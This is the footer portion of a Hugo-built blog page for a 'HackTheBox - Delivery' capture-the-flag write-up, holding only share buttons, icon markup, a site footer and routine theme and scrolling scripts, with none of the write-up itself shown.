<a class=next href=https://fahmifj.github.io/writeups/hackthebox/htb-ready/><span class=title>Next Page »</span><br><span>HackTheBox - Ready</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Delivery on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Delivery&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-delivery%2f&hashtags=Linux%2cTicketTrick%2cosTicket%2cMattermost%2cPassword-cracking%2cHashcat"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Delivery on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-delivery%2f&title=HackTheBox%20-%20Delivery&summary=HackTheBox%20-%20Delivery&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-delivery%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Delivery on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-delivery%2f&title=HackTheBox%20-%20Delivery"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Delivery on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-delivery%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Delivery on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Delivery%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-delivery%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Delivery on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Delivery&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-delivery%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://fahmifj.github.io/>友人F</a></span>
<span>&#183;</span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button>
</a><script>var toc=document.getElementsByClassName('toc')[0],pTag=document.getElementsByClassName('post-meta')[0];document.addEventListener('scroll',function(b){let a=document.documentElement.scrollTop;a>pTag.getBoundingClientRect().top+150?(toc.style.visibility='visible',toc.style.opacity='1'):(toc.style.visibility='hidden',toc.style.opacity='0')})</script><script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script></body></html>